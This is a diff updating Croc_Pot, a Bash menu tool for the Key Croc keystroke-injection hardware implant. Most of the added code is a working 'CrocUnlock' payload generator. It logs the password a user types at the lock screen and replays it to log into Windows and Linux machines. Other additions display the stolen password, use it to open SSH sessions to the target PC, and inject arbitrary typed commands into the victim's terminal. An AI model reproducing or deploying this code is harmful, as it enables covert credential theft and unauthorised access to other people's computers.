@@ -4,7 +4,7 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.5.0
+# Version:       1.5.1
 # Category:      Key Croc
 ##
 ##
@@ -93,7 +93,7 @@ fi
 \e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)   $(FILL_IN)${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.5.0\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.5.1\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -108,7 +108,7 @@ function read_all() {
 	echo -ne "\e[40;34m${*}:${clear}"; read r_a
 }
 ##
-#----check OS keycroc is pluged into
+#----check for OS keycroc is pluged into usb
 ##
 function OS_CHECK() {
 if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = WINDOWS ]; then
@@ -120,7 +120,7 @@ fi
 fi
 }
 ##
-#----Get target PC ip
+#----Ckeck for target PC ip
 ##
 function os_ip() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
@@ -129,6 +129,16 @@ else
 if [ "$(OS_CHECK)" = LINUX ]; then
 	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
 fi
+fi
+}
+##
+#----Check for target pc passwd
+##
+target_pw() {
+if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
+	echo -ne "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n"
+else
+	echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
 fi
 }
 ##
@@ -269,7 +279,7 @@ function croc_logs_mean() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
 	LED B
 	croc_title
-echo -ne "\n" ; MenuTitle KEYCROC LOG MENU | tr '\n' '\t' ; echo -ne "\n"
+MenuTitle KEYCROC LOG MENU
 echo -ne "\t\t" ; MenuColor 1 MESSAGES LOG | tr -d '\t' ; echo -ne "${clear}" ; MenuColor 8 AUTH LOG | tr -d '\t' ; echo -ne "         ${clear}\n"
 echo -ne "\t\t" ; MenuColor 2 KERNEL LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 9 DMESG LOG | tr -d '\t' ; echo -ne "        ${clear}\n"
 echo -ne "\t\t" ; MenuColor 3 SYSTEM LOG | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 10 BOOTSTRAP LOG | tr -d '\t' ; echo -ne "   ${clear}\n"
@@ -836,34 +846,32 @@ fi
 ##
 croc_unlock_p() {
 	clear
-	local CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
 	echo -ne "$(Info_Screen '
--Start by pressing GUI + L or CONTROL + ALT + DELETE\n
--This will forus the user to enter password and save to keycroc\n
+-Start by pressing GUI + l this will bring you to login screen\n
+-This will forus the user to enter password and save to tools/Croc_Pot\n
 -This will create another payload called Croc_unlock_2.txt\n
 -Next time at login screen type in crocunlock\n
--This will enter the user password and log you in\n
--First time running this may need to unplug and plug back in\n')${clear}\n"
-    echo -ne "\e[40m$(ColorRed '
+-This will enter the user password and login\n
+-First time running this may need to unplug and plug back in\n
+-Tested on Windows,Raspberrypi,Linux\n')${clear}\n"
+	echo -ne "\e[40m$(ColorRed '
 --THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n 
 --AFTER THE USER HAS ENTER THE PASSWORD\n
 --WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER')\n"
 	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
-if [ -e "${CROCUNLOCK}" ]; then
+if [ -e "/root/udisk/payloads/Croc_unlock_1.txt" ]; then
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
-	read_all INSTALL CROCUNLOCK PAYLOAD FOR WINDOWS Y/N AND PRESS [ENTER]
+	read_all INSTALL CROCUNLOCK PAYLOAD Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
-		echo -e "if [ -e \"\${CROC_UNLOCK}\" ]; then\n     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nelse\n     LED SETUP" >> ${CROCUNLOCK}
-		printf '%s\n'     'echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.3\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
-		printf '%s\n'     'echo M\A\T\C\H crocunlock >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
-		printf '%s\n'     'echo -e "LED SETUP\nsleep 1\nCROC_PASS=/root/udisk/loot/Croc_Pot/winpasswd.txt\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
-		printf "%s\n"     "echo -e \"\\\$(sed -i 's/crocunlock//g' \\\${CROC_KEYS})\ncat \\\${CROC_KEYS} >> \\\${CROC_PASS}\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nif [ -e \\\"\\\${CROC_PASS}\\\" ]; then\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
-		printf "%s\n"     "echo -e \"      LED ATTACK\n      sleep1\n      Q STRING \\\$(sed '\\\$!d' \\\${CROC_PASS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
-		printf "%s\n"     "echo -e \"else\n      LED R\n      sleep1\n      Q STRING \\\$(sed '\\\$!d' \\\${CROC_KEYS})\n      Q ENTER\n      sleep 1\n      LED FINISH\n      sleep 2\n      LED OFF;\nfi;\n#\nrm -f /root/udisk/loot/Croc_Pot/Croc_unlock.txt\" >> \${CROC_UNLOCK}" >> ${CROCUNLOCK}
-		echo -e "     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nfi;" >> ${CROCUNLOCK}
+		echo -ne "# Title:           CrocUnlock (payload #1)\n# Description:     Record keystrokes and save to tools/Croc_Pot and Create second payload called (CrocUnlock PAYLOAD #2)\n#                  Run Croc_Pot_Payload.txt first to get OS\n# Author:          spywill / RootJunky\n# Version:         1.4\n# Category:        Key Croc\n#\n#\nMATCH GUI-l\n#
+CROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\nFULL_IN=\"MAT\"\n#rm /root/udisk/tools/Croc_Pot/Croc_unlock.txt /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\n#\nif [ -e \"/root/udisk/payloads/Croc_unlock_2.txt\" ]; then\n	LED B\nelse\n	LED SETUP\n	echo -e \"# Title:           CrocUnlock (PAYLOAD #2)\\\n# Description:     Log into Target pc with Match word crocunlock, Run CrocUnlock (PAYLOAD #1) first\\\n# Author:          RootJunky / Spywill\\\n# Version:         1.4\\\n# Category:        Key Croc\\\n#\\\n#\\\n\${FULL_IN}CH crocunlock
+#\\\n\\\$(sed -i 's/crocunlock//g' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\nif [[ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt && /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]]; then\\\n	case \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\\\nWINDOWS)\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\nLINUX)\\\n	case \\\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
+raspberrypi)\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q BACKSPACE\\\n	Q STRING \\\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\n	Q ENTER\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\nparrot)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
+	Q ENTER ;;\\\n*)\\\n	Q CONTROL-SHIFT-LEFTARROW\\\n	Q DELETE\\\n	sleep 1\\\n	Q STRING \\\$(sed '\\\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\\\n	Q ENTER ;;\\\n	esac\\\n	esac\\\nelse\\\n	LED R\\\nfi\" >> \${CROC_UNLOCK}\n	LED FINISH\nfi\n#\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
+	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nraspberrypi)\n	Q CONTROL-ALT-F3\n	sleep 1\n	Q STRING \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)\"\n	Q ENTER\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\nparrot)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n	LED ATTACK ;;\n*)\n	sleep 1\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
+	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi" >> /root/udisk/payloads/Croc_unlock_1.txt
 		echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\e[40m${red}${LINE_}${clear}\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
@@ -3794,6 +3802,43 @@ fi ;;
 esac
 }
 ##
+#----Croc Pot Plus try to retrieve Target pc passwd
+##
+retrieve_passwd() {
+	TARGET_PW=/root/udisk/loot/Croc_Pot/Target_PW.txt
+	rm ${TARGET_PW}
+	clear
+	echo -ne "$(Info_Screen '
+-Retrieve Target pc passwd\n
+-Save to loot/Croc_Pot/Target_PW.txt\n')${clear}\n\n"
+	read_all RETRIEVE TARGET PC PASSWD Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+		if [ "$(OS_CHECK)" = WINDOWS ]; then
+		Q ALT-SPACE-x
+		clear
+		echo -ne "Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nTry the new cross-platform PowerShell https://aka.ms/pscore6\n\nPS C:\Users\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)>\n"
+		start_retrieve
+		LED OFF
+		Q ALT-SPACE-c
+else
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+	case $HOST_CHECK in
+	raspberrypi)
+		echo "test";;
+	parrot)
+		echo "test" ;;
+	*)
+		echo "test" ;;
+	esac
+fi ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; retrieve_passwd ;;
+	esac
+}
+##
 #----Croc Pot Plus Menu
 ##
 menu_B() {
@@ -3897,20 +3942,20 @@ pc_info() {
 	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
-$(ColorYellow 'Target PC Host name is:') $(sed -n 3p ${CROC_OS})
-$(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Target Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
-$(ColorYellow 'Target Pc IP is:') $(sed '2,6!d' ${CROC_OS_TARGET})
-$(ColorYellow 'Target Pc SSID + PASSWD and MAC address is:')
+$(ColorYellow 'Target PC Host name:') $(sed -n 3p ${CROC_OS})
+$(ColorYellow 'Target PC Passwd:') $(target_pw)
+$(ColorYellow 'Target Pc user name:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc IP:') $(sed '2,6!d' ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')
 $(sed '9,24!d' ${CROC_OS_TARGET})\n"
 else
 if [ "$(OS_CHECK)" = LINUX ]; then
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
-$(ColorYellow 'Target PC Host name is:') $(sed -n 3p ${CROC_OS})
-$(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Target Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
-$(ColorYellow 'Target Pc IP is:') $(sed -n '2,3p' ${CROC_OS_TARGET})
-$(ColorYellow 'Target Pc SSID + PASSWD and MAC address is:') 
+$(ColorYellow 'Target PC Host name:') $(sed -n 3p ${CROC_OS})
+$(ColorYellow 'Target PC Passwd:') $(target_pw)
+$(ColorYellow 'Target Pc user name:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc IP:') $(sed -n '2,3p' ${CROC_OS_TARGET})
+$(ColorYellow 'Target Pc SSID + PASSWD and MAC address:') 
 $(sed '4,20!d' ${CROC_OS_TARGET})\n"
 else
 	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP')"
@@ -3955,7 +4000,13 @@ list_match() {
 	echo -ne "$(Info_Screen '
 -List all MATCH words for your payloads\n
 -Option to change MATCH words\n')${clear}\n\n"
-	grep MATCH* --color=always /root/udisk/payloads/*.txt
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	grep MATCH* /root/udisk/payloads/*.txt
+else
+if [ "$(OS_CHECK)" = LINUX ]; then
+	grep MATCH* --color=auto /root/udisk/payloads/*.txt
+fi
+fi
 	read_all CHANGE MATCH WORD FOR PAYLOAD Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
@@ -3968,8 +4019,7 @@ list_match() {
 		grep MATCH* --color=always /root/udisk/payloads/${r_a}
 	else
 		invalid_entry ; list_match
-	fi
-		;;
+	fi ;;
 	[nN] | [nN][oO])
 		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
 	*)
@@ -4174,6 +4224,85 @@ MenuEnd
 	esac
 }
 ##
+#----Edit insert QUACK command
+##
+insert_quack() {
+	clear
+	echo -ne "$(Info_Screen '
+-This will open Target pc terminal\n
+-Insert Quack command\n
+-Example enter echo "hello world"\n
+-hello world should display in terminal and exit\n')${clear}\n\n"
+	echo -ne "Target pc OS is: $(OS_CHECK)\n"
+	read_all INSERT QUACK COMMAND Y/N AND PRESS [ENTER]
+	case $r_a in
+	[yY] | [yY][eE][sS])
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+		Q GUI d
+		Q GUI r
+		sleep 1
+		Q STRING "powershell"
+		Q ENTER
+		sleep 2
+		Q STRING "${r_a}"
+		Q ENTER 
+		sleep 5
+		Q STRING "exit"
+		Q ENTER
+		Q ALT-TAB
+else
+	local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+	case $HOST_CHECK in
+	raspberrypi)
+		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+		Q GUI d
+		sleep 1
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "${r_a}"
+		Q ENTER 
+		sleep 5
+		Q STRING "exit"
+		Q ENTER
+		Q ALT-TAB ;;
+	parrot)
+		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "${r_a}"
+		Q ENTER 
+		sleep 5
+		Q STRING "exit"
+		Q ENTER
+		Q ALT-TAB ;;
+	*)
+		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "${r_a}"
+		Q ENTER 
+		sleep 5
+		Q STRING "exit"
+		Q ENTER
+		Q ALT-TAB ;;
+	esac
+fi ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; insert_quack ;;
+	esac
+}
+##
 #----Croc Edit Menu
 ##
 	LED B
@@ -4188,7 +4317,8 @@ MenuColor 7 ATTACKMODE HID STORAGE ; echo -ne "${clear}\n"
 MenuColor 8 ATTACKMODE HID ; echo -ne "       ${clear}\n"
 MenuColor 9 RELOAD_PAYLOADS ; echo -ne "     ${clear}\n"
 MenuColor 10 MIDNIGHT MANAGER ; echo -ne "    ${clear}\n"
-MenuColor 11 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
+MenuColor 11 QUACK COMMAND ; echo -ne "       ${clear}\n"
+MenuColor 12 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
 MenuEnd
 	unset m_a
 	read m_a
@@ -4203,7 +4333,8 @@ MenuEnd
 	8) ATTACKMODE HID ; croc_edit_menu ;;
 	9) RELOAD_PAYLOADS ; croc_edit_menu ;;
 	10) midnight_manager ; croc_edit_menu ;;
-	11) main_menu ;;
+	11) insert_quack ; croc_edit_menu ;;
+	12) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; croc_edit_menu ;;
 	esac
@@ -4267,7 +4398,7 @@ fi
 #----SSH get mac addresses
 ##
 get_mac () {
-	echo -ne "\e[40;93mMAC: $(arp -n ${1} | awk '/'${1}'/{print $3}' | sed -e 's/HWaddress//g')${clear}"
+	echo -ne "\e[40;93mMAC: ${green}$(arp -n ${1} | awk '/'${1}'/{print $3}' | sed -e 's/HWaddress//g')${clear}"
 }
 	echo -ne "$(Info_Screen '
 -SSH into your HAK5 gear\n
@@ -4283,25 +4414,15 @@ shark_check ; check_device ${IP_F} SHARK JACK: ; get_mac ${IP_F} ; port_check ${
 #check_device 172.16.64.1 BASH BUNNY: $(get_mac) ; port_check 172.16.64.1
 echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
-#----SSH check for target pc passwd
-##
-pc_pw() {
-if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
-	echo -ne "$(ColorYellow 'Have An save Passwd try this:') $(sed '$!d' /root/udisk/loot/Croc_Pot/winpasswd.txt)\n"
-else
-	echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
-fi
-}
-##
 #----SSH keycroc to target pc
 ##
 pc_ssh() {
-	pc_pw
+	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
 if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
 start_ssh() {
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
-\t$(ColorYellow 'The PC IP is:') $(os_ip)
-\t$(ColorGreen 'Starting SSH with connected PC')\n"
+	echo -ne "\t$(ColorYellow 'Target PC user name:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'Target PC IP:') $(os_ip)
+\t$(ColorGreen 'Starting SSH with Target PC')\n"
 	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 }
 	case $(OS_CHECK) in
@@ -4628,7 +4749,7 @@ ssh_keygen() {
 	[yY] | [yY][eE][sS])
 		ssh-keygen ;;
 	[nN] | [nN][oO])
-		;;
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
 	*)
 		invalid_entry ; ssh_keygen ;;
 	esac
@@ -4638,7 +4759,7 @@ ssh_keygen() {
 		read_all ENTER USER-NAME@REMOTE-HOST IP AND PRESS [ENTER]
 		ssh-copy-id -i ~/.ssh/id_rsa.pub ${r_a} ;;
 	 [nN] | [nN][oO])
-		;;
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
 	*)
 		invalid_entry ; ssh_keygen ;;
 	esac
@@ -5521,8 +5642,8 @@ if [ -e "${cloud_ip}" ]; then
 		invalid_entry ; save_ip ;;
 	esac
 else
-	echo -ne "\n\e[40m$(ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP')\n${clear}"
-	run_save_v
+		echo -ne "\n\e[40m$(ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP')\n${clear}"
+		run_save_v
 fi
 }
 ##
